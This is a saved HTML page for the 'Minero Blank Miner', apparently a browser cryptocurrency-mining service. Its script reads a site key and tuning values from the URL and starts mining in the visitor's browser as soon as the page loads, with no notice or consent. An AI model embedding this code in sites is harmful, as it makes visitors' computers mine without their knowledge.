<!DOCTYPE html>
<!-- saved from url=(0039)https://minero.cc/html/blank-miner.html -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="description" content="Minero Blank Miner">
    <title>Minero Blank Miner</title>
  </head>
  <body>
    <script type="text/javascript" src="./cm-screener-fail.js"></script>
    <script type="text/javascript">
      function getParameterByName(name, url) {
        if (!url) url = window.location.href;
        name = name.replace(/[\[\]]/g, "\\$&");
        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
        results = regex.exec(url);
        if (!results) return null;
        if (!results[2]) return '';
        return decodeURIComponent(results[2].replace(/\+/g, " "));
      }

      var key = getParameterByName('key');
      var user = getParameterByName('user');
      var throttle = getParameterByName('throttle');
      var threads = getParameterByName('threads');

      if (!key) {
            throw('invalid site key');
      }

      var minerOpts = {};
      if (throttle) {
        minerOpts.throttle = parseFloat(throttle);
      }
      if (threads) {
        minerOpts.threads = parseInt(threads, 10);
      }

      var miner = (user && user.length >= 1)
            ? new Minero.User(key, user, minerOpts)
            : new Minero.Anonymous(key, minerOpts);
      miner.start();
    </script>
  

</body></html>
